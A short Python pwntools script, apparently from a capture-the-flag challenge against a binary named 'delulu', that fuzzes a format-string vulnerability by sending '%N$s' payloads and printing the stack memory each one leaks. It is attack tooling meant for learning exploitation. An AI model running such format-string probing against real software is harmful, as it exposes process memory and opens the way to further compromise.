from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('delulu', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print as a string the value
        # pointed to by the second pointer in the stack
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        p.recvuntil(b'.. ')
        result = p.recvuntil(b'\n')
        print(str(i) + ': ' + result[:-1].decode())
        # Exit the process
        p.close()
    except EOFError:
        pass
